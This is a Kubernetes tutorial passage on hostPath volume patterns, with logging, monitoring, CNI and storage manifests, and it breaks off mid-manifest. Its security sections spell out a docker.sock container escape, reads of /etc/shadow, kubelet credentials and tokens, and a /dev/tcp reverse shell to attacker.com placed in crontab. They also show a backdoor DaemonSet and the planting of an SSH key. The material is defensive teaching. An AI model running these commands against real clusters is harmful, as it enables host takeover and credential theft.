# Part 3: Real-World Areas You Must Understand
## From the Trenches: Production hostPath Patterns, Pitfalls, and War Stories

Let me share the battle-tested knowledge from years of running production Kubernetes clusters, responding to security incidents, and architecting enterprise platforms.

---

## 1. How hostPath Is Used in Production

### A. Logging Patterns

**The Challenge**: Applications write logs inside containers, but containers are ephemeral. How do you collect logs persistently?

#### Pattern 1: Host Log Directory (Most Common)

**Architecture**:
```
┌─────────────────────────────────────────┐
│           Node Filesystem               │
│                                         │
│  /var/log/pods/                         │
│  ├── namespace_pod-name_uid/            │
│  │   ├── container-1/                   │
│  │   │   └── 0.log  ← stdout/stderr    │
│  │   └── container-2/                   │
│  │       └── 0.log                      │
└─────────────────────────────────────────┘
         ↑                    ↑
         │                    │
    kubelet writes        DaemonSet reads
```

**Implementation**:
```yaml
# Fluentd DaemonSet collecting logs
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: fluentd
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: fluentd
  template:
    metadata:
      labels:
        app: fluentd
    spec:
      serviceAccountName: fluentd
      tolerations:
      - key: node-role.kubernetes.io/master
        effect: NoSchedule
      containers:
      - name: fluentd
        image: fluent/fluentd-kubernetes-daemonset:v1-debian-elasticsearch
        env:
        - name: FLUENT_ELASTICSEARCH_HOST
          value: "elasticsearch.logging.svc.cluster.local"
        - name: FLUENT_ELASTICSEARCH_PORT
          value: "9200"
        resources:
          limits:
            memory: 512Mi
          requests:
            cpu: 100m
            memory: 200Mi
        volumeMounts:
        # Read container logs
        - name: varlog
          mountPath: /var/log
          readOnly: true
        # Access pod metadata
        - name: varlibdockercontainers
          mountPath: /var/lib/docker/containers
          readOnly: true
        # Fluentd state
        - name: fluentd-pos
          mountPath: /var/log/fluentd-pos
      volumes:
      - name: varlog
        hostPath:
          path: /var/log
          type: Directory
      - name: varlibdockercontainers
        hostPath:
          path: /var/lib/docker/containers
          type: Directory
      - name: fluentd-pos
        hostPath:
          path: /var/log/fluentd-pos
          type: DirectoryOrCreate
```

**Why this works**:
- Kubelet automatically writes container stdout/stderr to `/var/log/pods/`
- Fluentd runs on every node (DaemonSet)
- Each Fluentd instance reads logs from its own node
- Logs are shipped to central Elasticsearch/S3/etc.

**Real-world considerations**:

1. **Log rotation**: `/var/log/pods/` can fill up disk
```yaml
# Add init container to configure log rotation
initContainers:
- name: setup-logrotate
  image: busybox
  command:
  - sh
  - -c
  - |
    cat > /etc/logrotate.d/kubernetes <<EOF
    /var/log/pods/*/*.log {
      rotate 7
      daily
      compress
      missingok
      notifempty
    }
    EOF
  volumeMounts:
  - name: logrotate-config
    mountPath: /etc/logrotate.d
```

2. **Disk space monitoring**:
```yaml
# Add disk usage alerts
- alert: NodeLogDiskFull
  expr: |
    (node_filesystem_avail_bytes{mountpoint="/var/log"} 
    / node_filesystem_size_bytes{mountpoint="/var/log"}) < 0.1
  annotations:
    summary: "Node {{ $labels.node }} /var/log is 90% full"
```

#### Pattern 2: Sidecar Log Collection

**When application writes to files (not stdout)**:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: app-with-file-logs
spec:
  containers:
  # Main application
  - name: app
    image: legacy-java-app
    volumeMounts:
    - name: app-logs
      mountPath: /var/log/app
    # App writes to /var/log/app/application.log
  
  # Sidecar reads logs and ships them
  - name: log-shipper
    image: fluent/fluent-bit
    volumeMounts:
    - name: app-logs
      mountPath: /var/log/app
      readOnly: true
    - name: host-logs  # Write to host for persistence
      mountPath: /host-logs
  
  volumes:
  - name: app-logs
    emptyDir: {}  # Shared between containers
  - name: host-logs
    hostPath:
      path: /var/log/shipped-app-logs
      type: DirectoryOrCreate
```

**Trade-off**: This uses emptyDir for app↔sidecar communication, but hostPath for persistence.

#### Pattern 3: Direct Host Directory (Legacy Apps)

**Some apps expect specific paths**:

```yaml
# Oracle DB expects logs in /u01/app/oracle/diag/
apiVersion: v1
kind: Pod
metadata:
  name: oracle-db
spec:
  containers:
  - name: oracle
    image: oracle/database:19.3.0-ee
    volumeMounts:
    - name: oracle-diag
      mountPath: /u01/app/oracle/diag
  volumes:
  - name: oracle-diag
    hostPath:
      path: /oracle-persistent/diag
      type: DirectoryOrCreate
```

**Problem**: This ties the Pod to a specific node. Better approach: Use PVC.

---

### B. Mounting CRI Sockets

**CRI = Container Runtime Interface**. The socket is how kubelet talks to the container runtime.

#### Common Socket Paths

| Runtime | Socket Path | Purpose |
|---------|------------|---------|
| Docker (legacy) | `/var/run/docker.sock` | Docker API |
| containerd | `/run/containerd/containerd.sock` | containerd API |
| CRI-O | `/var/run/crio/crio.sock` | CRI-O API |

#### Use Case 1: Building Container Images in CI/CD

**Docker-in-Docker pattern** (problematic but common):

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: jenkins-agent
spec:
  containers:
  - name: docker
    image: docker:20.10
    command: ['cat']
    tty: true
    volumeMounts:
    - name: docker-sock
      mountPath: /var/run/docker.sock
    securityContext:
      privileged: true  # Required for Docker operations
  volumes:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
      type: Socket
```

**What this enables**:
```bash
# Inside the Pod
docker build -t myapp:v1 .
docker push myregistry.com/myapp:v1
```

**CRITICAL SECURITY WARNING**:

This is **equivalent to root access on the host**. Here's why:

```bash
# Attacker inside the Pod with docker.sock mounted:
kubectl exec -it jenkins-agent -- sh

# Now they can:
docker run -it --privileged --net=host --pid=host --ipc=host \
  --volume /:/host busybox chroot /host

# They now have full root access to the node!
# Can read:
cat /host/etc/shadow
cat /host/var/lib/kubelet/pki/kubelet-client-current.pem

# Can write:
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" \
  >> /host/etc/crontab

# Can access other containers:
docker exec -it <any-container-on-node> sh
```

**Real incident I responded to**:

A developer's Jenkins agent was compromised via a vulnerable pipeline script. Attacker:
1. Injected malicious code into Jenkinsfile
2. Jenkins executed it in agent Pod with docker.sock mounted
3. Attacker used docker commands to escape to host
4. Installed cryptominer on all nodes
5. Exfiltrated Kubernetes secrets

**Cost**: $15,000 in cloud bills + 3 days incident response + cluster rebuild.

#### Safer Alternatives to Docker Socket Mounting

**Option 1: Kaniko (No Docker Daemon)**
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: kaniko-builder
spec:
  containers:
  - name: kaniko
    image: gcr.io/kaniko-project/executor:latest
    args:
    - --dockerfile=Dockerfile
    - --context=git://github.com/myorg/myapp.git
    - --destination=myregistry.com/myapp:v1
    volumeMounts:
    - name: docker-config
      mountPath: /kaniko/.docker/
  volumes:
  - name: docker-config
    secret:
      secretName: registry-credentials
      items:
      - key: .dockerconfigjson
        path: config.json
  # NO hostPath needed!
```

**Benefits**:
- No privileged mode
- No host access
- Builds in userspace
- Works in restricted PSPs

**Option 2: Buildah (Daemonless)**
```yaml
containers:
- name: buildah
  image: quay.io/buildah/stable
  command:
  - buildah
  - bud
  - -t
  - myapp:v1
  - .
  securityContext:
    capabilities:
      add:
      - SETUID
      - SETGID
  # NO docker.sock needed
```

**Option 3: BuildKit (Modern Docker)**
```yaml
# Use BuildKit in rootless mode
containers:
- name: buildkit
  image: moby/buildkit:rootless
  # Runs as non-root user
  # No host access needed
```

#### Use Case 2: Container Inspection/Monitoring

**cAdvisor (Container Advisor)**:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: cadvisor
spec:
  containers:
  - name: cadvisor
    image: gcr.io/cadvisor/cadvisor:latest
    volumeMounts:
    - name: rootfs
      mountPath: /rootfs
      readOnly: true
    - name: var-run
      mountPath: /var/run
      readOnly: true
    - name: sys
      mountPath: /sys
      readOnly: true
    - name: docker
      mountPath: /var/lib/docker
      readOnly: true
    - name: containerd
      mountPath: /run/containerd/containerd.sock
      readOnly: true
    ports:
    - name: http
      containerPort: 8080
  volumes:
  - name: rootfs
    hostPath:
      path: /
      type: Directory
  - name: var-run
    hostPath:
      path: /var/run
      type: Directory
  - name: sys
    hostPath:
      path: /sys
      type: Directory
  - name: docker
    hostPath:
      path: /var/lib/docker
      type: Directory
  - name: containerd
    hostPath:
      path: /run/containerd/containerd.sock
      type: Socket
```

**Why this is safer**:
- All mounts are **read-only**
- Used only for metrics collection
- Part of monitoring infrastructure (Prometheus)

**Still risky**: Can read container environment variables (secrets!), process lists, etc.

**Better approach**: Use Kubelet's built-in metrics instead:
```bash
# Kubelet exposes metrics without needing hostPath
curl https://node-ip:10250/metrics
```

---

### C. Accessing `/var/run/docker.sock` (Deep Dive)

Let me explain **exactly** why this is so dangerous.

#### What Is docker.sock?

```bash
# On the node
ls -la /var/run/docker.sock
# srwxrwx--- 1 root docker 0 Nov 19 10:00 /var/run/docker.sock
```

It's a **Unix domain socket** that provides the Docker API. Any process with access to this socket can:

1. **List all containers** (including system containers)
```bash
docker ps -a
# Shows: kubelet, kube-proxy, CNI pods, etc.
```

2. **Inspect containers** (see environment variables with secrets)
```bash
docker inspect <container-id>
# Shows:
# - Environment variables (API keys, passwords)
# - Mounted volumes
# - Network configuration
```

3. **Execute commands in any container**
```bash
docker exec -it <kubelet-container-id> sh
# Now you're inside the kubelet container!
```

4. **Create privileged containers**
```bash
docker run --privileged --pid=host --net=host \
  --volume /:/host ubuntu chroot /host bash
# Full host access
```

5. **Stop critical containers**
```bash
docker stop <kubelet-container-id>
# Node becomes NotReady, workloads evicted
```

#### Attack Scenario: The 5-Minute Cluster Takeover

**Setup**: Attacker gains access to a Pod with docker.sock mounted (e.g., compromised CI/CD)

**Step 1: Escape to host** (30 seconds)
```bash
docker run -d --privileged --pid=host --net=host \
  --volume /:/host --name escape-pod alpine sleep infinity
docker exec -it escape-pod chroot /host bash
# Now root on node
```

**Step 2: Steal kubelet credentials** (1 minute)
```bash
# On host
cat /var/lib/kubelet/pki/kubelet-client-current.pem > /tmp/kubelet.pem
cat /var/lib/kubelet/config.yaml
# Get API server address
```

**Step 3: Authenticate to API server** (1 minute)
```bash
kubectl --kubeconfig=/var/lib/kubelet/kubeconfig get nodes
# If kubelet has escalated permissions (older clusters):
kubectl --kubeconfig=/var/lib/kubelet/kubeconfig get secrets -A
```

**Step 4: Pivot to other nodes** (2 minutes)
```bash
# Create DaemonSet with docker.sock mounted
cat <<EOF | kubectl apply -f -
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: backdoor
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: backdoor
  template:
    metadata:
      labels:
        app: backdoor
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: backdoor
        image: alpine
        command: ['/bin/sh', '-c', 'while true; do sleep 3600; done']
        volumeMounts:
        - name: docker
          mountPath: /var/run/docker.sock
      volumes:
      - name: docker
        hostPath:
          path: /var/run/docker.sock
          type: Socket
EOF
# Now have access to ALL nodes via this DaemonSet
```

**Step 5: Persistence** (1 minute)
```bash
# Install SSH backdoor on all nodes
kubectl exec -it backdoor-xxxxx -- sh -c \
  "echo 'ssh-rsa AAAA... attacker@evil.com' >> /host/root/.ssh/authorized_keys"
```

**Total time: 5 minutes. Damage: Complete cluster compromise.**

#### Defense Strategies

**Defense 1: Pod Security Standards**
```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: ci-cd
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
# Restricted mode blocks hostPath volumes
```

**Defense 2: OPA Gatekeeper**
```yaml
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sBlockHostPath
metadata:
  name: block-docker-sock
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
    excludedNamespaces:
      - kube-system  # Allow for system components
  parameters:
    allowedHostPaths:
      # Explicitly whitelist safe paths
      - pathPrefix: /var/log
        readOnly: true
      - pathPrefix: /proc
        readOnly: true
    # Block dangerous paths
    blockedPaths:
      - /var/run/docker.sock
      - /run/containerd/containerd.sock
      - /var/lib/kubelet
      - /etc
```

**Defense 3: Audit Logging**
```yaml
# Enable audit logging for hostPath usage
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
- level: RequestResponse
  verbs: ["create", "update", "patch"]
  resources:
  - group: ""
    resources: ["pods"]
  omitStages:
  - RequestReceived
  # Log full Pod spec to catch hostPath usage
```

**Defense 4: Network Policies**
```yaml
# Even if Pod escapes, limit network damage
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-egress-from-ci
  namespace: ci-cd
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  # Only allow registry and internal services
  - to:
    - namespaceSelector:
        matchLabels:
          name: registry
    ports:
    - protocol: TCP
      port: 5000
```

---

### D. Mounting System Directories

**Common patterns and their risks**:

#### Pattern 1: Mounting `/proc` (Process Information)

**Use case**: Monitoring agents need process metrics

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: node-exporter
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: exporter
    image: prom/node-exporter
    args:
    - --path.procfs=/host/proc
    - --path.sysfs=/host/sys
    volumeMounts:
    - name: proc
      mountPath: /host/proc
      readOnly: true
    - name: sys
      mountPath: /host/sys
      readOnly: true
  volumes:
  - name: proc
    hostPath:
      path: /proc
      type: Directory
  - name: sys
    hostPath:
      path: /sys
      type: Directory
```

**What `/proc` exposes**:
- Process list (`/proc/*/cmdline`)
- Environment variables (`/proc/*/environ`) - **contains secrets!**
- Memory maps (`/proc/*/maps`)
- File descriptors (`/proc/*/fd`)
- Network connections (`/proc/net/tcp`)

**Security issue**:
```bash
# Inside Pod with /proc mounted
cat /host/proc/$(pidof kubelet)/environ
# Shows kubelet's environment, might include credentials
```

**Mitigation**:
```yaml
# Run with seccomp profile restricting /proc access
securityContext:
  seccompProfile:
    type: Localhost
    localhostProfile: restrict-proc-access.json
```

#### Pattern 2: Mounting `/sys` (System Information)

**Use case**: Hardware monitoring, network statistics

```yaml
volumes:
- name: sys
  hostPath:
    path: /sys
    type: Directory
```

**What `/sys` exposes**:
- Hardware info (`/sys/class/net/`, `/sys/class/block/`)
- Kernel parameters (`/sys/kernel/`)
- Device attributes

**Risk**: Less dangerous than `/proc`, but can leak hardware topology (NUMA, PCIe layout) useful for side-channel attacks.

#### Pattern 3: Mounting `/etc` (Configuration Files)

**Almost never legitimate**:

```yaml
# DON'T DO THIS
volumes:
- name: etc
  hostPath:
    path: /etc
    type: Directory
```

**What `/etc` contains**:
- `/etc/shadow` (password hashes)
- `/etc/ssh/` (SSH keys)
- `/etc/kubernetes/` (cluster config, certs)
- `/etc/ssl/` (TLS certificates)

**Exception**: Mounting specific files (not entire `/etc`):
```yaml
# OK: Specific config file
volumes:
- name: resolv
  hostPath:
    path: /etc/resolv.conf
    type: File
```

#### Pattern 4: Mounting `/var/lib/kubelet`

**Kubelet's working directory** - contains:
- Pod secrets: `/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/`
- ConfigMaps: `/var/lib/kubelet/pods/*/volumes/kubernetes.io~configmap/`
- Service account tokens
- Plugin sockets

**Legitimate use**: CSI drivers, device plugins

```yaml
# CSI driver needs to register with kubelet
volumes:
- name: registration-dir
  hostPath:
    path: /var/lib/kubelet/plugins_registry
    type: Directory
- name: plugin-dir
  hostPath:
    path: /var/lib/kubelet/plugins/csi-driver-name
    type: DirectoryOrCreate
```

**Attack vector**:
```bash
# Pod with /var/lib/kubelet mounted
find /var/lib/kubelet/pods -name token
# /var/lib/kubelet/pods/<pod-uid>/volumes/kubernetes.io~secret/default-token-xyz/token

cat /var/lib/kubelet/pods/<uid>/volumes/kubernetes.io~secret/*/token
# Now you have service account tokens for other Pods!
```

---

### E. Storing Node-Specific Data

**Use case**: Data that should persist on a specific node but not move with Pod

#### Example 1: Local Caching Layer

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: cache-warmer
spec:
  template:
    spec:
      containers:
      - name: cache
        image: redis:alpine
        volumeMounts:
        - name: cache-data
          mountPath: /data
      volumes:
      - name: cache-data
        hostPath:
          path: /var/cache/app-cache
          type: DirectoryOrCreate
```

**When this makes sense**:
- Cache can be rebuilt if lost
- Better performance than network storage
- Each node has independent cache

**When this doesn't make sense**:
- Critical data (use PVC)
- Needs to follow Pod (use PVC)
- Shared across nodes (use PVC with ReadWriteMany)

#### Example 2: Node-Local Databases (EdgeDB Pattern)

**Edge computing scenario**: Store data locally on edge nodes

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: edge-db
spec:
  nodeSelector:
    node-role: edge
  containers:
  - name: sqlite
    image: nouchka/sqlite3
    volumeMounts:
    - name: db
      mountPath: /db
  volumes:
  - name: db
    hostPath:
      path: /mnt/edge-storage/db
      type: DirectoryOrCreate
```

**Requirements**:
- `nodeName` or strong `nodeSelector` to pin to specific node
- Backup strategy (data lost if node fails)
- Monitoring for disk space

---

### F. Sidecar Containers Reading Host Logs

**Pattern**: Application logs to files, sidecar ships them

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: app-with-sidecar-logger
spec:
  containers:
  # Main application
  - name: nginx
    image: nginx
    volumeMounts:
    - name: nginx-logs
      mountPath: /var/log/nginx
  
  # Sidecar log shipper
  - name: fluentbit
    image: fluent/fluent-bit
    volumeMounts:
    - name: nginx-logs
      mountPath: /var/log/nginx
      readOnly: true
    - name: fluentbit-config
      mountPath: /fluent-bit/etc/
  
  volumes:
  # Shared between containers in same Pod
  - name: nginx-logs
    emptyDir: {}  # NOT hostPath - this is ephemeral
  
  # Config from ConfigMap
  - name: fluentbit-config
    configMap:
      name: fluentbit-config
```

**Key point**: Use `emptyDir` for container-to-container sharing within a Pod, not hostPath.

**When you DO need hostPath**:

```yaml
# Sidecar reading logs from host (not from app container)
volumes:
- name: host-app-logs
  hostPath:
    path: /var/log/legacy-app  # App runs outside Kubernetes
    type: Directory
```

---

## 2. When to Use hostPath in DaemonSets

**The Golden Rule**: hostPath + DaemonSet = Natural fit

**Why?**
- One Pod per node (no collision)
- Pod always on same node (data locality)
- Node-specific operations (by design)

### Pattern Matrix

# hostPath + DaemonSet: The Complete Pattern Guide

## When hostPath + DaemonSet Is The Right Choice

### ✅ Perfect Fit Scenarios

| Use Case | hostPath Mounts | Why DaemonSet | Example |
|----------|----------------|---------------|---------|
| **Log Collection** | `/var/log/pods`, `/var/log/containers` | Each node's logs stay on that node | Fluentd, Fluent Bit |
| **Metrics Collection** | `/proc`, `/sys`, `/dev` | Node-level metrics | node-exporter, cAdvisor |
| **Network CNI** | `/etc/cni/net.d`, `/opt/cni/bin` | Per-node network config | Calico, Cilium, Flannel |
| **Storage CSI** | `/var/lib/kubelet/plugins` | Per-node storage drivers | Rook, Longhorn, OpenEBS |
| **Security Scanning** | `/var/run/docker.sock` (read-only) | Scan all node containers | Falco, Twistlock |
| **Node Maintenance** | `/`, `/var/lib/kubelet` | OS-level operations | Node problem detector |

---

## Detailed Patterns

### Pattern 1: Log Aggregation (Fluentd)

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: fluentd
  namespace: kube-system
  labels:
    app: fluentd
    kubernetes.io/cluster-service: "true"
spec:
  selector:
    matchLabels:
      app: fluentd
  updateStrategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1  # Update one node at a time
  template:
    metadata:
      labels:
        app: fluentd
    spec:
      serviceAccountName: fluentd
      tolerations:
      # Run on all nodes including masters
      - key: node-role.kubernetes.io/master
        operator: Exists
        effect: NoSchedule
      - key: node-role.kubernetes.io/control-plane
        operator: Exists
        effect: NoSchedule
      
      # Ensure Pod runs on node even during disruptions
      priorityClassName: system-node-critical
      
      containers:
      - name: fluentd
        image: fluent/fluentd-kubernetes-daemonset:v1.15-debian-elasticsearch7-1
        env:
        - name: FLUENT_ELASTICSEARCH_HOST
          value: "elasticsearch.logging.svc.cluster.local"
        - name: FLUENT_ELASTICSEARCH_PORT
          value: "9200"
        - name: FLUENT_ELASTICSEARCH_SCHEME
          value: "http"
        - name: FLUENTD_SYSTEMD_CONF
          value: "disable"
        - name: FLUENT_CONTAINER_TAIL_EXCLUDE_PATH
          value: /var/log/containers/fluentd-*  # Don't collect own logs
        
        resources:
          limits:
            memory: 512Mi
          requests:
            cpu: 100m
            memory: 200Mi
        
        volumeMounts:
        # Container logs written by kubelet
        - name: varlog
          mountPath: /var/log
          readOnly: true
        
        # Container metadata and logs
        - name: varlibdockercontainers
          mountPath: /var/lib/docker/containers
          readOnly: true
        
        # Fluentd position file (tracks what's been read)
        - name: fluentd-buffer
          mountPath: /var/log/fluentd-buffers
        
        # Configuration from ConfigMap
        - name: fluentd-config
          mountPath: /fluentd/etc/fluent.conf
          subPath: fluent.conf
      
      terminationGracePeriodSeconds: 30
      
      volumes:
      - name: varlog
        hostPath:
          path: /var/log
          type: Directory
      
      - name: varlibdockercontainers
        hostPath:
          path: /var/lib/docker/containers
          type: Directory
      
      - name: fluentd-buffer
        hostPath:
          path: /var/log/fluentd-buffers
          type: DirectoryOrCreate  # Create if missing
      
      - name: fluentd-config
        configMap:
          name: fluentd-config
```

**Why this works**:
1. **One Fluentd per node**: No collision, each reads its node's logs
2. **Node-local state**: Position file tracks progress per node
3. **Automatic scheduling**: New node joins → DaemonSet creates Pod automatically
4. **Tolerations**: Runs even on master nodes (collect system logs)
5. **Read-only mounts**: Can't corrupt logs on host

**Critical considerations**:
```yaml
# Prevent Fluentd from consuming all disk
resources:
  limits:
    memory: 512Mi  # Limit memory usage
  requests:
    ephemeral-storage: 1Gi  # Reserve space for buffers

# Add liveness probe to restart if stuck
livenessProbe:
  httpGet:
    path: /metrics
    port: 24231
  initialDelaySeconds: 30
  periodSeconds: 10

# Graceful shutdown to flush buffers
terminationGracePeriodSeconds: 30
lifecycle:
  preStop:
    exec:
      command: ["/bin/sh", "-c", "sleep 10"]
```

---

### Pattern 2: Node Metrics (Prometheus node-exporter)

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-exporter
  namespace: monitoring
spec:
  selector:
    matchLabels:
      app: node-exporter
  template:
    metadata:
      labels:
        app: node-exporter
    spec:
      hostNetwork: true  # Use host networking for accurate network metrics
      hostPID: true      # See all processes
      
      containers:
      - name: node-exporter
        image: quay.io/prometheus/node-exporter:latest
        args:
        - --path.procfs=/host/proc
        - --path.sysfs=/host/sys
        - --path.rootfs=/host/root
        - --collector.filesystem.mount-points-exclude=^/(dev|proc|sys|var/lib/docker/.+|var/lib/kubelet/.+)($|/)
        - --collector.filesystem.fs-types-exclude=^(autofs|binfmt_misc|bpf|cgroup2?|configfs|debugfs|devpts|devtmpfs|fusectl|hugetlbfs|iso9660|mqueue|nsfs|overlay|proc|procfs|pstore|rpc_pipefs|securityfs|selinuxfs|squashfs|sysfs|tracefs)$
        
        ports:
        - name: metrics
          containerPort: 9100
          hostPort: 9100  # Expose on host network
        
        resources:
          limits:
            memory: 180Mi
          requests:
            cpu: 100m
            memory: 180Mi
        
        volumeMounts:
        # System proc filesystem
        - name: proc
          mountPath: /host/proc
          readOnly: true
          mountPropagation: HostToContainer
        
        # System sys filesystem
        - name: sys
          mountPath: /host/sys
          readOnly: true
          mountPropagation: HostToContainer
        
        # Root filesystem (for disk metrics)
        - name: root
          mountPath: /host/root
          readOnly: true
          mountPropagation: HostToContainer
        
        securityContext:
          allowPrivilegeEscalation: false
          capabilities:
            drop:
            - ALL
          readOnlyRootFilesystem: true
          runAsNonRoot: true
          runAsUser: 65534  # nobody user
      
      tolerations:
      - effect: NoSchedule
        operator: Exists
      
      volumes:
      - name: proc
        hostPath:
          path: /proc
          type: Directory
      
      - name: sys
        hostPath:
          path: /sys
          type: Directory
      
      - name: root
        hostPath:
          path: /
          type: Directory
---
# Service to expose metrics
apiVersion: v1
kind: Service
metadata:
  name: node-exporter
  namespace: monitoring
  labels:
    app: node-exporter
spec:
  type: ClusterIP
  clusterIP: None  # Headless service
  selector:
    app: node-exporter
  ports:
  - name: metrics
    port: 9100
    targetPort: 9100
```

**Why this pattern is secure**:
1. ✅ **Read-only mounts**: Can't modify host system
2. ✅ **Non-root user**: Runs as UID 65534 (nobody)
3. ✅ **Dropped capabilities**: No special privileges
4. ✅ **Read-only root FS**: Container filesystem immutable
5. ✅ **Filtered collectors**: Excludes sensitive mount points

**Metrics exposed** (examples):
- `node_cpu_seconds_total` - CPU usage
- `node_memory_MemAvailable_bytes` - Available memory
- `node_disk_io_time_seconds_total` - Disk I/O
- `node_network_receive_bytes_total` - Network traffic
- `node_filesystem_avail_bytes` - Disk space

---

### Pattern 3: CNI Network Plugin (Calico)

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: calico-node
  namespace: kube-system
spec:
  selector:
    matchLabels:
      k8s-app: calico-node
  updateStrategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1
  template:
    metadata:
      labels:
        k8s-app: calico-node
    spec:
      hostNetwork: true  # Required for CNI
      tolerations:
      - operator: Exists  # Run on all nodes
      
      serviceAccountName: calico-node
      terminationGracePeriodSeconds: 0
      priorityClassName: system-node-critical
      
      initContainers:
      # Install CNI binaries
      - name: install-cni
        image: calico/cni:v3.26.0
        command: ["/opt/cni/bin/install"]
        env:
        - name: CNI_CONF_NAME
          value: "10-calico.conflist"
        - name: CNI_NETWORK_CONFIG
          valueFrom:
            configMapKeyRef:
              name: calico-config
              key: cni_network_config
        volumeMounts:
        - name: cni-bin-dir
          mountPath: /host/opt/cni/bin
        - name: cni-net-dir
          mountPath: /host/etc/cni/net.d
      
      containers:
      - name: calico-node
        image: calico/node:v3.26.0
        env:
        # Cluster CIDR
        - name: CALICO_IPV4POOL_CIDR
          value: "10.244.0.0/16"
        
        # Enable BGP
        - name: CALICO_NETWORKING_BACKEND
          value: "bird"
        
        # Detect node IP
        - name: IP
          value: "autodetect"
        
        # Node name
        - name: NODENAME
          valueFrom:
            fieldRef:
              fieldPath: spec.nodeName
        
        securityContext:
          privileged: true  # Required for network manipulation
        
        resources:
          requests:
            cpu: 250m
        
        livenessProbe:
          httpGet:
            path: /liveness
            port: 9099
            host: localhost
          periodSeconds: 10
          initialDelaySeconds: 10
          failureThreshold: 6
        
        readinessProbe:
          exec:
            command:
            - /bin/calico-node
            - -bird-ready
            - -felix-ready
          periodSeconds: 10
        
        volumeMounts:
        # CNI binaries
        - name: cni-bin-dir
          mountPath: /host/opt/cni/bin
        
        # CNI config
        - name: cni-net-dir
          mountPath: /host/etc/cni/net.d
        
        # Container runtime socket
        - name: var-run
          mountPath: /var/run
        
        # Network state
        - name: var-lib-calico
          mountPath: /var/lib/calico
        
        # iptables lock
        - name: xtables-lock
          mountPath: /run/xtables.lock
        
        # Host /proc for setting network sysctls
        - name: proc
          mountPath: /host/proc
      
      volumes:
      - name: cni-bin-dir
        hostPath:
          path: /opt/cni/bin
          type: DirectoryOrCreate
      
      - name: cni-net-dir
        hostPath:
          path: /etc/cni/net.d
          type: DirectoryOrCreate
      
      - name: var-run
        hostPath:
          path: /var/run
          type: Directory
      
      - name: var-lib-calico
        hostPath:
          path: /var/lib/calico
          type: DirectoryOrCreate
      
      - name: xtables-lock
        hostPath:
          path: /run/xtables.lock
          type: FileOrCreate
      
      - name: proc
        hostPath:
          path: /proc
          type: Directory
```

**Why CNI requires privileged + hostPath**:
1. **Network namespace manipulation**: Must create/modify network namespaces
2. **iptables/nftables rules**: Configure packet filtering
3. **Network interfaces**: Create veth pairs, bridges
4. **Routing tables**: Modify kernel routing
5. **CNI binary installation**: Write to `/opt/cni/bin`

**Security trade-off**: CNI plugins MUST be trusted (they have root-equivalent access)

---

### Pattern 4: CSI Storage Driver (Rook/Ceph OSD)

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: rook-ceph-osd
  namespace: rook-ceph
spec:
  selector:
    matchLabels:
      app: rook-ceph-osd
  template:
    metadata:
      labels:
        app: rook-ceph-osd
    spec:
      serviceAccountName: rook-ceph-osd
      
      initContainers:
      # Detect available disks
      - name: config-init
        image: rook/ceph:v1.12.0
        command: ["/usr/local/bin/rook"]
        args: ["ceph", "osd", "init"]
        volumeMounts:
        - name: devices
          mountPath: /dev
        - name: udev
          mountPath: /run/udev
      
      containers:
      - name: osd
        image: rook/ceph:v1.12.0
        command: ["/usr/local/bin/rook"]
        args: ["ceph", "osd", "start"]
        
        securityContext:
          privileged: true  # Required for block device access
        
        volumeMounts:
        # Block devices
        - name: devices
          mountPath: /dev
        
        # Udev for device discovery
        - name: udev
          mountPath: /run/udev
        
        # Persistent OSD data
        - name: ceph-osd-data
          mountPath: /var/lib/ceph/osd
        
        # Ceph config
        - name: ceph-config
          mountPath: /etc/ceph
        
        env:
        - name: ROOK_OSD_UUID
          valueFrom:
            fieldRef:
              fieldPath: metadata.name
        
        - name: ROOK_OSD_ID
          valueFrom:
            fieldRef:
              fieldPath: metadata.labels['ceph-osd-id']
      
      volumes:
      - name: devices
        hostPath:
          path: /dev
          type: Directory
      
      - name: udev
        hostPath:
          path: /run/udev
          type: Directory
      
      - name: ceph-osd-data
        hostPath:
          path: /var/lib/rook/osd0
          type: DirectoryOrCreate
      
      - name: ceph-config
        emptyDir: {}
```

**Why storage drivers need hostPath**:
1. **Block device access**: Direct disk I/O via `/dev/sdb`, etc.
2. **Device discovery**: Scan `/dev` for available disks
3. **Persistent storage**: Store OSD metadata on host
4. **Udev events**: Detect disk hotplug/removal

---

### Pattern 5: Security Monitoring (Falco)

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: falco
  namespace: security
spec:
  selector:
    matchLabels:
      app: falco
  template:
    metadata:
      labels:
        app: falco
    spec:
      serviceAccountName: falco
      hostNetwork: true
      hostPID: true
      
      tolerations:
      - effect: NoSchedule
        operator: Exists
      
      containers:
      - name: falco
        image: falcosecurity/falco:latest
        
        securityContext:
          privileged: true  # Required for kernel module
        
        args:
        - /usr/bin/falco
        - --cri
